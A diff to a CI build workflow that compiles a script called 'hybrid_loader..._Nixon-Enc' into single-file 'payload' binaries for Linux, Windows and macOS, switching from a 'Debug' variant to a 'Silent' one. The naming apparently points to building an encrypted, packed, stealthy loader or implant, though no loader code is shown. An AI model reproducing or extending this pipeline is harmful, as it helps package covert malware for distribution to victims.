@@ -12,17 +12,17 @@ jobs:
             target: linux
             artifact: payload.linux.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_pmwvab8o_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_pmwvab8o_Nixon-Enc_Silent_Packed.py
           - os: windows-latest
             target: windows
             artifact: payload.windows.exe
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_pmwvab8o_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_pmwvab8o_Nixon-Enc_Silent_Packed.py
           - os: macos-14
             target: macos
             artifact: payload.macos.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_pmwvab8o_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_pmwvab8o_Nixon-Enc_Silent_Packed.py
 
     runs-on: ${{ matrix.os }}
     steps:
